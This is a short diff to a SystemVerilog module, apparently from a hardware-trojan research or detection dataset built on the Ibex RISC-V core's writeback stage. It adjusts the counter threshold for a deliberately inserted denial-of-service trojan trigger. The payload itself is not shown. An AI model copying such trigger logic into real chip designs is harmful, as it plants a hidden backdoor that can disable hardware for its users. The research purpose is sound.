@@ -62,12 +62,11 @@ module ibex_wb_stage_trojan_DoS #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=18552)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18055;
+    localparam int TRIGGER_THRESHOLD = 18552;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
